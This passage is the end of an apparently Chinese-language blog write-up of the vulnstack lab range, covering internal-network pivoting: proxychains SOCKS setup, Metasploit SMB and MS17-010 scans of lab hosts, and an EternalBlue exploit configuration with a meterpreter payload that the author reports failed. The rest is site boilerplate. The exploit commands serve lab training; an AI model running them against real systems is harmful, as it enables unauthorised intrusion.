+<p><img src="/posts/e94e95f1/set_socks_proxy.png"></p>
+<p><code>sudo /etc/proxychains4.conf</code></p>
+<p>修改kali proxychains4.conf配置为<code>socks5 127.0.0.1 1080</code> </p>
+<br>
+
+<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>使用smb扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhosts 192.168.183.0&#x2F;24&#96;</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>扫到两台windows机器</p>
+<p><img src="/posts/e94e95f1/smb_scan1.png"></p>
+<p><img src="/posts/e94e95f1/smb_scan2.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.183.130   win2008</span><br><span class="line">192.168.183.148   win7</span><br></pre></td></tr></table></figure>
+
+<p>用ms17-010扫一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130,148</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e94e95f1/smb_ms17_010.png"></p>
+<p>两台机器都存在ms17-010漏洞</p>
+<p>使用ms17-010进行攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line">set rhosts 192.168.183.148</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set autorunscript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>两台机器都没打通……</p>
+<p><img src="/posts/e94e95f1/ms17010_fail.png"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/vulnstack/" rel="tag"></i><i class="fa fa-tag"></i> vulnstack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/2ce9ab7f/" rel="prev" title="vulnstack3靶场">
+      <i class="fa fa-chevron-left"></i> vulnstack3靶场
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#phpmyadmin-CVE-2018-12613"><span class="nav-number">3.1.</span> <span class="nav-text">phpmyadmin CVE-2018-12613</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#struts2"><span class="nav-number">3.2.</span> <span class="nav-text">struts2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat"><span class="nav-number">3.3.</span> <span class="nav-text">tomcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-number">3.4.</span> <span class="nav-text">上线msf</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8CVE-2019-5736%E8%BF%9B%E8%A1%8Cdocker%E9%80%83%E9%80%B8"><span class="nav-number">4.1.</span> <span class="nav-text">利用CVE-2019-5736进行docker逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E2%80%93privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="nav-number">4.2.</span> <span class="nav-text">利用–privileged特权模式逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf-1"><span class="nav-number">4.3.</span> <span class="nav-text">上线msf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.4.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="nav-number">4.5.</span> <span class="nav-text">设置代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mamor"
+      src="/images/kabi.jpg">
+  <p class="site-author-name" itemprop="name">Mamor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Mamor5409" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Mamor5409" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mamor</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">260k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:56</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<!--
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共69k字</span>
+</div>
+-->
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/ClickShowText.js"></script>
+
+<script type="text/javascript">
+var windowWidth = $(window).width();
+if (windowWidth > 768) {
+    document.write('<script type="text/javascript" src="/js/sakura.js"><\/script>');
+}
+</script>
+
+
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+</html>
+
